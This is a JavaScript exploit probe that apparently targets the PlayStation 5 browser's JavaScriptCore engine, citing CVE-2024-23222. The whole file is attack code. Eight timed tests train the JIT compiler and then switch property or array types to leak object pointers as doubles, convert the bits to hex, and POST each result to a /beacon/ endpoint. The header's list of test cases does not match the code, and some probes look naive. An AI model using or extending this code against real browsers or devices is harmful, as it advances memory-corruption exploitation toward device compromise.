/* p103-typeconfuse — JIT type confusion primitives
 *
 * CVE-2024-23222: Type confusion in JSC, patched Safari 17.3 (Jan 2024).
 * PS5 fw 14.20 = Safari 17.2.x = PRE-FIX.
 *
 * Strategy: DFG compiles with one type assumption, then we feed a different
 * type. If the structure check is missing on certain paths, the compiled code
 * misinterprets object layout → type confusion → addrof/fakeobj.
 *
 * G1: Basic property type confusion (double → object)
 * G2: Array element type confusion (contiguous → double)
 * G3: Prototype chain confusion
 * G4: Callback-induced type transition during DFG-compiled operation
 * G5: valueOf/toString type transition race
 * G6: Proxy-based type confusion
 * G7: Specific 23222 pattern: with() + structure transition
 *
 * Beacon prefix: V103G-
 */
(function(){
"use strict";
var RUN_ID = "v103g" + Math.random().toString(36).slice(2,12);
var PREFIX = "V103G-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press103-typeconfuse");

/* ====== G1: Property type confusion — double vs object ====== */
function test_G1() {
  var r = {};
  try {
    // Train DFG to expect .x is always a double
    function readX(obj) {
      return obj.x;
    }

    var trainObj = {x: 1.1, y: 2.2};
    for (var i = 0; i < 200000; i++) {
      trainObj.x = i + 0.1;
      readX(trainObj);
    }
    r.warmupDone = true;

    // Now create object with SAME structure but x is an object
    // JSC uses "structure" (hidden class) — if x starts as double,
    // changing to object changes the structure
    var confuseObj = {x: 1.1, y: 2.2};
    confuseObj.x = {};  // type transition: double → object

    var leaked = readX(confuseObj);
    r.leakedType = typeof leaked;
    if (typeof leaked === 'number') {
      r.leakedVal = leaked;
      r.leakedHex = '0x' + (leaked > 0 ? Math.floor(leaked).toString(16) : leaked);
      r.CONFUSION = true;
    } else if (typeof leaked === 'object') {
      r.leakedIsObj = true;
      r.CONFUSION = false;
    }

    // Also try with inline cache miss
    var confuseObj2 = {};
    confuseObj2.y = 2.2; // different property order
    confuseObj2.x = {};
    var leaked2 = readX(confuseObj2);
    r.leaked2Type = typeof leaked2;

    r.SURVIVED = true;
    B("G1-PROP-CONFUSE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G1-ERR", r); }
}

/* ====== G2: Array element type confusion ====== */
function test_G2() {
  var r = {};
  try {
    // Create array of doubles, train DFG to expect doubles
    function readArr(arr, idx) {
      return arr[idx];
    }

    var dblArr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
    for (var i = 0; i < 200000; i++) {
      readArr(dblArr, i & 7);
    }
    r.warmupDone = true;

    // Create a new array and transition it from double to contiguous
    var victimArr = [1.1, 2.2, 3.3, 4.4];
    victimArr[0] = {};  // transitions to contiguous storage

    // DFG-compiled readArr might still read as double
    var leaked = readArr(victimArr, 0);
    r.leakedType = typeof leaked;
    if (typeof leaked === 'number') {
      r.leakedVal = leaked;
      r.IS_NAN = isNaN(leaked);
      r.leakedBits = '0x' + (leaked > 0 ? Math.floor(leaked).toString(16) : leaked);
      r.CONFUSION = true;
    } else {
      r.CONFUSION = false;
    }

    r.SURVIVED = true;
    B("G2-ARR-CONFUSE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G2-ERR", r); }
}

/* ====== G3: valueOf callback type transition ====== */
function test_G3() {
  var r = {};
  try {
    // Object with valueOf that mutates type during comparison
    var victim = {x: 1.1, y: 2.2};
    var transitioned = false;

    var evil = {
      valueOf: function() {
        if (!transitioned) {
          victim.x = {};  // mutate during valueOf
          transitioned = true;
        }
        return 42;
      }
    };

    function compare(obj, val) {
      var a = obj.x;      // Read x (DFG assumes double)
      var b = val + 0;    // Triggers valueOf → mutates victim.x
      var c = obj.x;      // Read x again — might use cached assumption
      return [a, c];
    }

    // Warmup with safe values
    for (var i = 0; i < 200000; i++) {
      compare({x: i + 0.1, y: 0}, i);
    }
    r.warmupDone = true;

    // Trigger
    transitioned = false;
    var result = compare(victim, evil);
    r.beforeType = typeof result[0];
    r.afterType = typeof result[1];
    r.beforeVal = typeof result[0] === 'number' ? result[0] : 'obj';
    r.afterVal = typeof result[1] === 'number' ? result[1] : 'obj';
    r.CONFUSION = (typeof result[0] === 'number' && typeof result[1] === 'number' && result[1] !== result[0]);

    // If afterVal is a number but victim.x is now an object, we have confusion
    if (typeof result[1] === 'number' && typeof victim.x === 'object') {
      r.LEAK = true;
      r.leakedHex = '0x' + Math.floor(Math.abs(result[1])).toString(16);
    }

    r.SURVIVED = true;
    B("G3-VALUEOF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G3-ERR", r); }
}

/* ====== G4: Getter-based confusion ====== */
function test_G4() {
  var r = {};
  try {
    var storage = 1.1;
    var reads = 0;

    var obj = {};
    Object.defineProperty(obj, 'x', {
      get: function() {
        reads++;
        if (reads > 200005) {
          storage = {};  // Switch from double to object after warmup
        }
        return storage;
      }
    });

    function readProp(o) {
      return o.x;
    }

    // Warmup
    for (var i = 0; i < 200000; i++) {
      readProp(obj);
    }
    r.warmupDone = true;
    r.reads = reads;

    // Trigger — getter now returns object but DFG may expect double
    var result = readProp(obj);
    r.resultType = typeof result;
    if (typeof result === 'number') {
      r.resultVal = result;
      r.CONFUSION = true;
    } else {
      r.CONFUSION = false;
    }

    r.SURVIVED = true;
    B("G4-GETTER", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G4-ERR", r); }
}

/* ====== G5: Structure transition via delete ====== */
function test_G5() {
  var r = {};
  try {
    function accessBoth(obj) {
      var a = obj.a;
      var b = obj.b;
      return a + b;
    }

    // Train with consistent structure
    var proto = {a: 1.1, b: 2.2};
    for (var i = 0; i < 200000; i++) {
      proto.a = i + 0.1;
      proto.b = i + 0.2;
      accessBoth(proto);
    }
    r.warmupDone = true;

    // Create object, delete property to force transition to dictionary mode
    var victim = {a: 1.1, b: 2.2};
    delete victim.b;
    victim.b = {};  // Re-add as object type

    var result = accessBoth(victim);
    r.resultType = typeof result;
    if (typeof result === 'number' && !isNaN(result) && result > 1000000) {
      r.CONFUSION = true;
      r.resultHex = '0x' + Math.floor(result).toString(16);
    } else {
      r.resultStr = String(result).slice(0, 30);
    }

    r.SURVIVED = true;
    B("G5-DELETE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G5-ERR", r); }
}

/* ====== G6: Array.prototype pollution confusion ====== */
function test_G6() {
  var r = {};
  try {
    function sumArr(arr) {
      var s = 0;
      for (var i = 0; i < arr.length; i++) {
        s += arr[i];
      }
      return s;
    }

    // Train with clean double arrays
    for (var i = 0; i < 50000; i++) {
      sumArr([1.1, 2.2, 3.3]);
    }
    r.warmupDone = true;

    // Create array with hole, put object on prototype at that index
    var holey = [1.1, , 3.3];  // hole at index 1
    Array.prototype[1] = {};

    var result = sumArr(holey);
    r.resultType = typeof result;
    r.resultStr = String(result).slice(0, 50);
    // If result is a large number instead of NaN/"1.1[object Object]3.3",
    // the double read bypassed the prototype lookup
    if (typeof result === 'number' && !isNaN(result) && result > 100) {
      r.CONFUSION = true;
      r.resultHex = '0x' + Math.floor(result).toString(16);
    }

    // Clean up
    delete Array.prototype[1];

    r.SURVIVED = true;
    B("G6-PROTO-POLLUTION", r);
  } catch(e) {
    delete Array.prototype[1];
    r.err = e.name + ":" + e.message.slice(0,60);
    B("G6-ERR", r);
  }
}

/* ====== G7: Specific pattern — concurrent structure transition ====== */
function test_G7() {
  var r = {};
  try {
    // Pattern inspired by CVE-2024-23222 reports:
    // Use constructor that transitions object type during allocation

    function Obj(x) {
      this.a = x;
      this.b = x;
    }

    function readA(obj) {
      return obj.a;
    }

    // Phase 1: Train with doubles
    for (var i = 0; i < 200000; i++) {
      var o = new Obj(i + 0.1);
      readA(o);
    }
    r.warmupP1 = true;

    // Phase 2: Create objects that transition during construction
    function EvilObj(x) {
      this.a = x;          // DFG expects double here
      this.a = {};          // IMMEDIATELY overwrite with object
      this.b = x;
    }
    EvilObj.prototype = Obj.prototype;  // Same prototype

    var evil = new EvilObj(1337.1337);
    var leaked = readA(evil);
    r.p2Type = typeof leaked;
    if (typeof leaked === 'number') {
      r.p2Val = leaked;
      r.CONFUSION_P2 = true;
    }

    // Phase 3: Polymorphic IC with type transition
    function readBoth(obj) {
      var x = obj.a;
      return x;
    }

    var safe = new Obj(42.42);
    for (var i = 0; i < 200000; i++) {
      readBoth(safe);
    }
    r.warmupP3 = true;

    // Transition safe object's .a to object
    safe.a = {ptr: 0xDEAD};
    var leaked3 = readBoth(safe);
    r.p3Type = typeof leaked3;
    if (typeof leaked3 === 'number') {
      r.p3Val = leaked3;
      r.p3Hex = '0x' + Math.floor(Math.abs(leaked3)).toString(16);
      r.CONFUSION_P3 = true;
    }

    r.SURVIVED = true;
    B("G7-CVE23222", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G7-ERR", r); }
}

/* ====== G8: Butterfly pointer leak via array mode transition ====== */
function test_G8() {
  var r = {};
  try {
    // JSC arrays have different "indexing types":
    // Int32, Double, Contiguous, ArrayStorage
    // Transitioning between these during JIT execution may leak

    function getFirst(arr) {
      return arr[0];
    }

    // Train with Int32 arrays
    for (var i = 0; i < 200000; i++) {
      getFirst([i, i+1, i+2]);
    }
    r.warmupDone = true;

    // Create double array
    var dArr = [1.1, 2.2, 3.3];
    var result1 = getFirst(dArr);
    r.dblResult = result1;

    // Transition to contiguous by storing object
    dArr[1] = {};
    var result2 = getFirst(dArr);
    r.afterTransition = typeof result2 === 'number' ? result2 : typeof result2;

    // Try the reverse: contiguous → read as double
    function getFirstDouble(arr) {
      return arr[0];
    }
    var dArr2 = [1.1, 2.2, 3.3];
    for (var i = 0; i < 200000; i++) {
      dArr2[0] = i + 0.1;
      getFirstDouble(dArr2);
    }

    // Put an object at [0]
    dArr2[0] = {leak: 0xBEEF};
    var leaked = getFirstDouble(dArr2);
    r.leakedType = typeof leaked;
    if (typeof leaked === 'number' && leaked !== 0) {
      r.leakedVal = leaked;
      r.CONFUSION = true;
      // Try to extract bits
      var buf = new ArrayBuffer(8);
      var f64 = new Float64Array(buf);
      var u32 = new Uint32Array(buf);
      f64[0] = leaked;
      r.lo = '0x' + (u32[0] >>> 0).toString(16);
      r.hi = '0x' + (u32[1] >>> 0).toString(16);
    }

    r.SURVIVED = true;
    B("G8-BUTTERFLY", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("G8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_G1();                    // Property confusion (0ms)
  setTimeout(test_G2, 3000);    // Array element confusion (3s)
  setTimeout(test_G3, 8000);    // valueOf callback (8s)
  setTimeout(test_G4, 14000);   // Getter confusion (14s)
  setTimeout(test_G5, 20000);   // Delete structure transition (20s)
  setTimeout(test_G6, 26000);   // Prototype pollution (26s)
  setTimeout(test_G7, 32000);   // CVE-2024-23222 pattern (32s)
  setTimeout(test_G8, 38000);   // Butterfly leak (38s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe103-done"); }, 55000);
})();
